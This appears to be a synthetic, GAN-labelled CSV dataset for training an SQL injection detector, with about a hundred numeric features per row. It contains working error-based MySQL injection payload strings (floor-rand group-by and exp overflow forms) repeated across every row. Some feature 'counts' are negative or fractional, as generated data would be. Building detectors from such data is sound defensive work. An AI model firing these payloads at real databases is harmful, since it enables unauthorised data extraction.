id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000159,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.300704970322689,278.8856506347656,73.23943328857422,41.41291427612305,102.08485412597656,2.019341468811035,88.90914916992188,38.93864440917969,1.0075434446334839,0.2815193235874176,0.16281114518642426,0.3936215937137604,0.12597502768039703,3.7093636989593506,0.9174069762229919,1.2907748222351074,0.5886090397834778,0.21428628265857697,-0.17444300651550293,0.01802418939769268,9.88271427154541,9.533792495727539,3.4110426902770996,0.1028084084391594,1.8165408372879028,0.3723956346511841,0.01429141964763403,0.03571927547454834,0.11740351468324661,1.1761868000030518,-0.1280304342508316,-0.04416443407535553,1.9552617073059082,-0.04025522246956825,0.25862470269203186,2.3707308769226074,8.189191818237305,0.9120122194290161,3.1985912322998047,0.469741553068161,0.42180854082107544,1.13277006149292,-0.1242157593369484,0.0015365667641162872,0.4500259459018707,-0.3403591513633728,-0.2247193157672882,0.3520076274871826,0.30806291103363037,0.430902898311615,0.052031029015779495,0.20349478721618652,-0.15223385393619537,0.48956772685050964,0.48546814918518066,0.019723495468497276,0.08790860325098038,0.1679336428642273,0.12245072424411774,0.03934647515416145,0.13267961144447327,-0.13980253040790558,-0.36269786953926086,0.15070074796676636,0.13132846355438232,-0.018025126308202744,0.8003714680671692,0.29524120688438416,0.16672751307487488,0.17014527320861816,-0.045870110392570496,-0.10776889324188232,-0.07028289139270782,0.10688944160938263,0.05406275764107704,0.08050473779439926,1.3239235877990723,0.33998847007751465,-0.14359182119369507,0.0788361057639122,0.6365101337432861,9.8526029586792,0.8566964268684387,0.3561125695705414,-0.006999528035521507,0.6762014031410217,-0.07681231200695038,0.007807046175003052,-0.04719270020723343
GAN_000160,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.773291653139938,280.0788269042969,76.0594253540039,40.7209587097168,101.73143005371094,-2.6381163597106934,92.33879852294922,40.81204605102539,1.2138603925704956,0.28049877285957336,0.16161708533763885,0.3990132808685303,0.12280195951461792,3.7431302070617676,1.185275673866272,1.2524499893188477,0.45370617508888245,0.12282659113407135,-0.22505584359169006,0.2782626152038574,10.946982383728027,9.279635429382324,3.390174150466919,0.029378660023212433,1.7025153636932373,0.3360336720943451,0.09515317529439926,0.0016979583306238055,0.13192187249660492,1.0154904127120972,-0.046834301203489304,-0.06461688131093979,1.7156096696853638,0.12777826189994812,0.2567155063152313,2.1296846866607666,7.491031169891357,0.8518713116645813,3.39426851272583,0.8273777365684509,0.6041525602340698,1.170843482017517,-0.11534247547388077,0.0048010628670454025,0.39029213786125183,-0.32462799549102783,-0.27756959199905396,0.5337843298912048,0.2826491594314575,0.4729517698287964,0.14386387169361115,0.2635467052459717,-0.3810616731643677,0.25181135535240173,0.5032183527946472,-0.032744865864515305,-0.008350430056452751,0.06285645067691803,0.25166112184524536,0.21724796295166016,-0.03972043842077255,0.21735692024230957,-0.36099883913993835,0.057037390768527985,0.18186992406845093,0.29076501727104187,0.7410691976547241,0.5552307367324829,0.028055423870682716,-0.3216473162174225,-0.22527900338172913,-0.37416645884513855,-0.021213348954916,-0.11605812609195709,0.039518702775239944,-0.017078109085559845,1.0587574243545532,0.09938863664865494,-0.220624178647995,-0.011029228568077087,0.4849344789981842,8.00313663482666,0.9672008156776428,0.3406274914741516,-0.10061557590961456,0.7744659185409546,-0.02067967876791954,0.017739731818437576,-0.2003544718027115
GAN_000161,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.341356086637979,280.3457946777344,77.46138000488281,42.971492767333984,105.12831115722656,-2.933523654937744,86.36970520019531,39.3170280456543,1.280674695968628,0.2971299886703491,0.16109851002693176,0.3948279023170471,0.12820827960968018,3.776754140853882,1.6791845560073853,1.2110966444015503,0.6036478281021118,0.2154766023159027,0.11777567118406296,0.19502736628055573,10.793357849121094,9.131925582885742,4.207979679107666,-0.08347494900226593,1.7236268520355225,0.3103641867637634,0.15562278032302856,-0.052928149700164795,0.1295710802078247,1.3721659183502197,-0.028992537409067154,-0.3246890604496002,2.0522549152374268,0.14054186642169952,0.2797403037548065,2.3119096755981445,8.036070823669434,0.7923004627227783,3.483339548110962,0.5496052503585815,0.5594009160995483,0.9544107913970947,0.03679642826318741,0.006116177886724472,0.16022512316703796,-0.09128271043300629,-0.2314133495092392,0.35219240188598633,0.38983118534088135,0.5085684061050415,0.03506879881024361,0.22351248562335968,-0.10674335062503815,0.06639976054430008,0.41570690274238586,-0.000694404065143317,0.12461262196302414,0.028893087059259415,0.18472923338413239,0.2673945128917694,-0.11278299242258072,0.09436041116714478,-0.14341652393341064,0.06818468123674393,0.062215033918619156,-0.004516247659921646,0.7264489531517029,0.3117707371711731,0.09944300353527069,0.04981612786650658,-0.18072056770324707,0.01947181113064289,0.1031571477651596,0.20596522092819214,0.0539930984377861,-0.11904507875442505,1.1733366250991821,0.3247816264629364,-0.19642004370689392,0.05274756997823715,0.41869989037513733,9.868498802185059,0.8698670864105225,0.3237648904323578,-0.006788531318306923,0.7905824780464172,-0.010529061779379845,0.2909175157546997,0.015403777360916138
GAN_000162,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.1631395940903255,271.45819091796875,79.50831604003906,42.202423095703125,101.59769439697266,2.8801727294921875,85.36141967773438,37.1867561340332,1.262143611907959,0.2930249571800232,0.15867727994918823,0.39069321751594543,0.12573574483394623,3.7782270908355713,1.301101803779602,0.9238228797912598,0.5495518445968628,0.11644619703292847,-0.1191282719373703,0.025073161348700523,9.725395202636719,9.545161247253418,3.8910975456237793,0.0730242133140564,1.828157901763916,0.28633278608322144,0.11825282871723175,0.22104576230049133,0.10963582992553711,1.1124215126037598,0.02233809232711792,-0.1106828898191452,1.9535101652145386,0.17285484075546265,0.30040258169174194,2.1842494010925293,7.374207019805908,0.7889794111251831,2.867771625518799,0.5177696347236633,0.4653500020503998,1.026537537574768,0.023121729493141174,0.0009772684425115585,0.10456207394599915,-0.03324463963508606,-0.29363712668418884,0.3694046437740326,0.31998762488365173,0.3507694602012634,0.13151712715625763,0.2839396893978119,-0.2766936123371124,0.142851322889328,0.5236115455627441,0.06142087280750275,0.10035962611436844,-0.0016149617731571198,0.13824467360973358,0.12417273223400116,-0.014758720993995667,0.15971213579177856,-0.03490612655878067,-0.031833432614803314,0.08424362540245056,0.017626911401748657,0.7709726095199585,0.06382034718990326,0.07342908531427383,-0.11895410716533661,-0.0501730814576149,-0.17432346940040588,-0.05678614601492882,0.007979236543178558,0.025381797924637794,0.06976041942834854,1.122789740562439,0.34457165002822876,-0.09676448255777359,0.023326873779296875,0.43312954902648926,9.343005180358887,0.7927793264389038,0.34665146470069885,-0.004773514345288277,0.6870282292366028,-0.2207607924938202,0.04698473587632179,-0.004959031939506531
GAN_000163,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.402086236576125,274.3865051269531,80.26313018798828,40.944786071777344,103.63842010498047,1.595763921737671,85.69414520263672,38.36434555053711,1.0055828094482422,0.2896841764450073,0.15777726471424103,0.39938604831695557,0.12258577346801758,3.7155721187591553,0.9943323731422424,1.3860186338424683,0.7255082726478577,0.13024772703647614,0.12771067023277283,0.06302141398191452,9.657296180725098,9.64277172088623,3.7633607387542725,0.10114658623933792,1.7150640487670898,0.3290534019470215,0.17066390812397003,0.07292123138904572,0.25100478529930115,1.0896224975585938,-0.0995887815952301,0.006994433701038361,1.911142110824585,0.11049921810626984,0.32084381580352783,2.2262372970581055,7.586255073547363,1.1112252473831177,3.1048293113708496,0.39346083998680115,0.44080638885498047,1.0665576457977295,-0.15704864263534546,0.026694241911172867,0.13637149333953857,-0.3342423439025879,-0.2212267816066742,0.4578373432159424,0.32571378350257874,0.3888927400112152,0.11286019533872604,0.179757222533226,-0.3004038631916046,0.37653231620788574,0.4531171917915344,0.054800763726234436,0.1263255476951599,0.2070198357105255,0.1035231500864029,0.12252266705036163,0.10505511611700058,0.00669126957654953,-0.3243405818939209,0.012053929269313812,0.14462684094905853,-0.06817615777254105,0.7899143695831299,0.2089802622795105,0.15256726741790771,0.021483659744262695,-0.03430543094873428,-0.3024543821811676,-0.06281307339668274,0.030622966587543488,0.04361796751618385,-0.07496519386768341,1.34354567527771,0.29297247529029846,-0.016099020838737488,0.00020718612358905375,0.38652583956718445,8.650200843811035,0.7830556035041809,0.30003029108047485,-0.03773057833313942,0.7397707104682922,0.05503350496292114,-0.2019970417022705,-0.07286737859249115
GAN_000164,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.289825497481334,273.0550537109375,79.82462310791016,40.6878547668457,103.8115234375,-2.900872230529785,84.53694152832031,38.0827522277832,0.8496077656745911,0.3123159408569336,0.16774645447731018,0.39558717608451843,0.1254459023475647,3.8080990314483643,1.4990804195404053,0.9367554187774658,0.4716727137565613,0.12936434149742126,0.08656187355518341,0.2386917918920517,9.763011932373047,9.300983428955078,4.1304216384887695,0.02862589806318283,1.6883987188339233,0.29954859614372253,-0.03676926717162132,-0.030253887176513672,0.15931831300258636,1.08394193649292,-0.04218810424208641,-0.2516683340072632,2.0777032375335693,-0.022747062146663666,0.30655696988105774,2.0640501976013184,7.957064151763916,1.3693982362747192,3.3181068897247314,0.5914572477340698,0.3782283067703247,0.8690322041511536,-0.02179878205060959,0.03360222280025482,0.05645826458930969,-0.2594318389892578,0.07651723921298981,0.36595073342323303,0.3625548779964447,0.48060357570648193,0.16739068925380707,0.16354183852672577,-0.03548827022314072,-0.03662082552909851,0.3818884491920471,0.05518864095211029,0.11087389290332794,0.029273435473442078,0.1383569985628128,0.34925568103790283,-0.19321823120117188,-0.1393233835697174,-0.02365037053823471,0.2257268726825714,0.06557723879814148,-0.1149253249168396,0.7082350850105286,0.28385624289512634,0.09197279810905457,0.11321751773357391,0.022462520748376846,-0.08677241206169128,0.22829332947731018,0.05009559541940689,0.03694405406713486,-0.2296757698059082,1.2494003772735596,0.4482835531234741,-0.1550026535987854,0.09649641811847687,0.4644071161746979,9.115657806396484,0.8814710378646851,0.2866051495075226,0.024559499695897102,0.7987219095230103,0.2231091558933258,-0.14470109343528748,0.0595574676990509
GAN_000165,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.274402789042666,273.9505920410156,78.62809753417969,40.37991714477539,100.24341583251953,1.1919724941253662,86.4416732788086,37.79037857055664,1.1408538818359375,0.28812578320503235,0.15975716710090637,0.3937504291534424,0.12515434622764587,3.7526113986968994,1.1487879753112793,1.0509953498840332,0.48215246200561523,0.13596147298812866,-0.0864635780453682,-0.1824854612350464,9.948600769042969,9.397404670715332,3.2816686630249023,0.08782071620225906,1.8202946186065674,0.32068029046058655,0.08606762439012527,0.07474468648433685,0.11222255229949951,1.0855978727340698,-0.0020321495831012726,-0.10872560739517212,1.9637244939804077,0.07492586970329285,0.27623292803764343,2.144479513168335,7.799126625061035,0.9599103927612305,3.1725094318389893,0.6176431775093079,0.46170756220817566,1.0118889808654785,-0.006859838962554932,0.01736624911427498,0.22459760308265686,-0.2553229331970215,-0.1552019864320755,0.3130238354206085,0.2835553288459778,0.43301016092300415,0.14660997688770294,0.24354709684848785,-0.20831367373466492,0.23346835374832153,0.5077728033065796,0.025016790255904198,0.08516465127468109,-0.07394556701183319,0.12027058005332947,0.25166043639183044,-0.08243068307638168,0.039411477744579315,-0.0872015580534935,0.00436786562204361,0.12923002243041992,0.10065070539712906,0.8092610836029053,0.2509748637676239,-0.02893180027604103,-0.10608229041099548,-0.04729241877794266,-0.1531275510787964,0.08102776855230331,-0.027395904064178467,0.03483092784881592,0.05409841611981392,1.077121615409851,0.3113153576850891,-0.1266998052597046,0.07669243216514587,0.5027210116386414,9.368021011352539,0.8333221077919006,0.2876863479614258,0.01187777891755104,0.7703765034675598,-0.019602909684181213,-0.056081607937812805,0.007342256605625153
GAN_000166,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.518081596692212,280.3570556640625,71.15836334228516,41.8071403503418,101.56047058105469,-2.251676559448242,91.79570007324219,40.07532501220703,1.0811223983764648,0.28131455183029175,0.1682320535182953,0.3945562541484833,0.1261681765317917,3.699573040008545,0.91801917552948,1.2195682525634766,0.4570527672767639,0.2249351441860199,-0.3015184998512268,0.11817887425422668,10.259870529174805,9.417088508605957,3.3520426750183105,0.05395057052373886,1.7705787420272827,0.349995881319046,-0.01852138713002205,-0.050709307193756104,0.07317730039358139,1.1043058633804321,-0.10477131605148315,-0.05923358350992203,1.7826554775238037,-0.028658684343099594,0.2732376456260681,2.3639376163482666,8.30235481262207,0.9180757403373718,3.323791027069092,0.7411656379699707,0.4571610689163208,1.1364529132843018,-0.3032067120075226,-0.014591502025723457,0.4933929145336151,-0.3561147451400757,-0.27228981256484985,0.3844459652900696,0.2963480055332184,0.48581740260124207,-0.002145152073353529,0.13786205649375916,-0.2846733033657074,0.43308180570602417,0.4964838922023773,-0.01757180131971836,0.06548039615154266,0.282432496547699,0.24224229156970978,0.2878814935684204,0.03868342190980911,-0.1079593375325203,-0.4149061143398285,0.20489197969436646,0.15925803780555725,0.14032569527626038,0.803448498249054,0.4549383223056793,0.03977309912443161,-0.016833335161209106,-0.10608308017253876,-0.11137626320123672,0.07229418307542801,0.02834630012512207,0.05764902010560036,0.011390149593353271,1.2958651781082153,0.36474186182022095,-0.2175765037536621,0.08333884179592133,0.5874808430671692,9.420533180236816,0.955708920955658,0.3880666196346283,-0.030475875362753868,0.6653174161911011,-0.06781119853258133,0.020428739488124847,-0.1911555528640747
GAN_000167,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.2986564514700945,275.8208923339844,77.62718963623047,42.07160949707031,100.04423522949219,0.9644420146942139,84.87276458740234,37.540897369384766,0.985053539276123,0.2827512323856354,0.15594446659088135,0.39205634593963623,0.12537820637226105,3.7632248401641846,1.3550490140914917,1.0521512031555176,0.6183213591575623,0.11792197823524475,-0.0010096002370119095,-0.0010577384382486343,9.984753608703613,9.655662536621094,3.736199140548706,0.01792944222688675,1.7136266231536865,0.3259260058403015,0.12266786396503448,0.10460835695266724,0.24329976737499237,1.185238003730774,-0.04637438431382179,-0.13744527101516724,1.888694167137146,0.20190079510211945,0.24943895637989044,2.2151904106140137,7.807711601257324,0.9681200385093689,2.909576892852783,0.3725302219390869,0.48744478821754456,1.1093645095825195,0.09733081609010696,0.008293695747852325,0.25152990221977234,-0.21239261329174042,-0.16046668589115143,0.4169001877307892,0.33669668436050415,0.4293068051338196,0.18714046478271484,0.2668207883834839,-0.1470315009355545,0.21948543190956116,0.46015360951423645,0.08365167677402496,0.11250883340835571,0.17768549919128418,-0.06530079990625381,0.2382499873638153,0.006624326109886169,0.06262713670730591,-0.17058563232421875,0.028948478400707245,0.11399055272340775,0.042508840560913086,0.7378696799278259,0.18041133880615234,0.08504039794206619,0.00037936121225357056,-0.17972305417060852,-0.2662617862224579,0.013565637171268463,0.013896957039833069,0.028699679300189018,0.05698342248797417,1.1734719276428223,0.22983892261981964,-0.11252670735120773,0.0567103773355484,0.46890944242477417,9.28889274597168,0.8386867642402649,0.3372724950313568,-0.02033463679254055,0.7451454401016235,0.026163507252931595,-0.04993004724383354,0.006696626543998718
GAN_000168,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.262704798359131,276.33050537109375,74.68926239013672,40.71504592895508,105.52632904052734,1.1668319702148438,91.80393981933594,39.183162689208984,1.005344271659851,0.281516432762146,0.16637036204338074,0.38878104090690613,0.12476928532123566,3.780874729156494,1.1180747747421265,1.0054274797439575,0.4656994640827179,0.1755691021680832,-0.15802571177482605,0.04045964777469635,10.092231750488281,9.580930709838867,3.678053855895996,-0.022650159895420074,1.7609069347381592,0.32708021998405457,-0.025853022933006287,-0.0638781487941742,0.12383493036031723,1.170398235321045,0.042701996862888336,-0.2273731529712677,2.1163268089294434,-0.0038662366569042206,0.2941091060638428,2.17345929145813,8.159940719604492,0.9854750037193298,3.0998661518096924,0.5955218076705933,0.48378023505210876,1.0284231901168823,-0.036176182329654694,0.019147835671901703,0.30752989649772644,-0.2681560516357422,0.012231007218360901,0.27001816034317017,0.40832409262657166,0.5228686332702637,0.07109925895929337,0.1338128298521042,0.08239947259426117,0.11505887657403946,0.41214025020599365,0.026408961042761803,0.10982507467269897,-0.0016495771706104279,0.1143181174993515,0.33743008971214294,-0.05846475437283516,-0.05070255696773529,0.0012739598751068115,-0.02584720402956009,0.10150524973869324,0.01395859569311142,0.7464524507522583,0.29940029978752136,0.07178018987178802,0.001959472894668579,-0.23647096753120422,-0.011200844310224056,0.09553752094507217,0.009717114269733429,0.03885954990983009,-0.09721435606479645,1.2468394041061401,0.3934372067451477,-0.18057647347450256,0.10244093835353851,0.5601053833961487,9.618766784667969,0.9260348677635193,0.34709200263023376,0.009231125935912132,0.7158319354057312,0.08455491811037064,0.0819244235754013,0.14000079035758972
GAN_000169,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.37000388887186,274.968017578125,78.7525405883789,40.431156158447266,105.36128997802734,-1.8547372817993164,88.08716583251953,40.35613250732422,0.9155572652816772,0.2742452025413513,0.16512887179851532,0.3941463232040405,0.12284296751022339,3.763040542602539,1.2776267528533936,1.3860340118408203,0.6332759857177734,0.1963663399219513,0.14023931324481964,0.1698247641324997,10.490038871765137,9.711901664733887,4.121096611022949,-0.10515464842319489,1.619598388671875,0.38095101714134216,0.03468498960137367,-0.18969213962554932,0.18145175278186798,1.3597840070724487,-0.06636480987071991,-0.20842137932777405,2.0129401683807373,-0.023934494704008102,0.34192851185798645,2.214775323867798,8.187956809997559,0.9441852569580078,3.3909993171691895,0.43276137113571167,0.4862186908721924,1.0766692161560059,-0.18458282947540283,0.019858375191688538,0.2246229350566864,-0.3454993963241577,-0.06486117839813232,0.35054606199264526,0.45661553740501404,0.5492569804191589,-0.0069505381397902966,0.09065400809049606,0.1792992353439331,0.2698430120944977,0.3926934599876404,0.030686883255839348,0.10912980139255524,0.030371814966201782,0.1519523710012436,0.24448394775390625,0.09763368219137192,-0.12732236087322235,-0.15986627340316772,0.02379319816827774,0.0937204658985138,-0.17785874009132385,0.7149907350540161,0.368346244096756,0.16834379732608795,0.2107454091310501,-0.2437756061553955,-0.017122924327850342,0.12498271465301514,0.14200130105018616,0.05512680858373642,-0.3047679662704468,1.4790763854980469,0.40376272797584534,-0.18756210803985596,-0.01438245177268982,0.5578535199165344,9.135376930236816,0.9962475299835205,0.3597337305545807,0.0031738243997097015,0.8154494166374207,0.3197992444038391,0.1638350486755371,0.12891480326652527
GAN_000170,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.4429690857550135,268.8090515136719,72.95401763916016,40.40022659301758,104.91238403320312,2.203789472579956,88.75328826904297,38.674198150634766,0.8695561289787292,0.2877095639705658,0.1647571474313736,0.3942706882953644,0.1225251704454422,3.7841579914093018,0.9040095210075378,1.1668123006820679,0.5440731644630432,0.18825653195381165,0.12334061414003372,0.02198396436870098,10.125408172607422,9.66147518157959,3.5288918018341064,0.05359874665737152,1.777063012123108,0.42711299657821655,0.08015727996826172,0.07922254502773285,0.28247731924057007,1.2521700859069824,-0.00734366849064827,-0.313636839389801,2.0366556644439697,-0.1218988448381424,0.24353575706481934,2.2949843406677246,8.190964698791504,1.0798404216766357,3.1355175971984863,0.24728840589523315,0.5030273199081421,0.9869889616966248,-0.005018465220928192,0.03907573223114014,0.29452136158943176,-0.4484596252441406,0.025370091199874878,0.3565158247947693,0.44115570187568665,0.4984589219093323,0.18298226594924927,0.09689129143953323,0.02209947258234024,0.23184528946876526,0.430501252412796,0.07091999799013138,0.09359706193208694,0.021199706941843033,-0.12904100120067596,0.171687513589859,0.14035674929618835,-0.12294062972068787,-0.20246249437332153,0.012498259544372559,0.11013402044773102,0.05522929131984711,0.7096686959266663,0.27450811862945557,0.07672470808029175,0.1419425904750824,-0.2576020658016205,-0.17818228900432587,0.07603605836629868,-0.10941576957702637,0.039359577000141144,-0.11307933926582336,1.3188552856445312,0.30834993720054626,-0.10034919530153275,0.12967166304588318,0.49702322483062744,9.429851531982422,0.8419945240020752,0.3050716817378998,0.00500265508890152,0.7651933431625366,0.11371447890996933,-0.058899156749248505,0.10052648186683655
GAN_000171,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.202153304347582,271.4300537109375,75.39618682861328,40.9801025390625,101.78653717041016,3.618882179260254,84.87525177001953,36.4596061706543,0.9310884475708008,0.3035605847835541,0.15937645733356476,0.39197027683258057,0.1267559826374054,3.783604145050049,1.1741416454315186,0.8726377487182617,0.47793328762054443,0.14746594429016113,0.07600513845682144,-0.009031027555465698,9.594592094421387,9.664694786071777,3.562849521636963,0.10638748854398727,1.844773530960083,0.32968804240226746,0.052949290722608566,0.1988932490348816,0.20926405489444733,1.16993248462677,0.05353289842605591,-0.19002510607242584,1.9265174865722656,0.025685979053378105,0.2412438839673996,2.262634038925171,7.919949054718018,1.0507960319519043,2.8877034187316895,0.4166499674320221,0.4002530574798584,1.0214309692382812,0.0155787393450737,0.030712779611349106,0.19294267892837524,-0.18478040397167206,-0.15821239352226257,0.3645114302635193,0.3471747934818268,0.39094236493110657,0.236391082406044,0.20779593288898468,-0.1439899355173111,0.24619844555854797,0.4881376326084137,0.07294608652591705,0.06454350054264069,0.010464102029800415,-0.11635763198137283,0.14350871741771698,0.11707185953855515,-0.06594458967447281,-0.09631486982107162,0.02899213880300522,0.09873814135789871,0.012684635818004608,0.7348573207855225,0.21380949020385742,0.025112373754382133,0.055750127881765366,-0.06525261700153351,-0.13884635269641876,0.03347598761320114,-0.010687589645385742,0.025849374011158943,0.02169330231845379,1.1643139123916626,0.30892065167427063,-0.07473012059926987,0.10173281282186508,0.4991441071033478,9.611732482910156,0.7729175090789795,0.28977376222610474,0.01561737060546875,0.7193226218223572,-0.06847041845321655,-0.005611808970570564,-0.07032766938209534
